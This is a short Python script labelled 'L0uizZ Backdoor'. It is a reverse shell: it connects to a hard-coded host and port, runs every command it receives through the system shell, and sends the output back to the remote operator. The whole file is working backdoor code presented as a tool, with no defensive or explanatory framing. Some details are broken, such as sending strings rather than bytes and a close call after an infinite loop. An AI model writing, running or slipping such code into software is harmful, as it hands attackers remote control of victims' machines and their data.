# L0uizZ Backdoor
# 02.12.2016
# 2nd to launch

import socket
import subprocess
from pip._vendor.distlib.compat import raw_input
from sys import stderr

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def trycon():
    s.connect(("192.168.2.201", 9999))
    s.send("[+] connection established")
    streamshell()
    
def streamshell():
    print("[+] connection established")
    while True:
        data = s.recv(512)
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout = proc.stdout.read()
        stderr = proc.stderr.read()
        s.send(stdout)
        s.send(stderr)
    s.close()
    
trycon()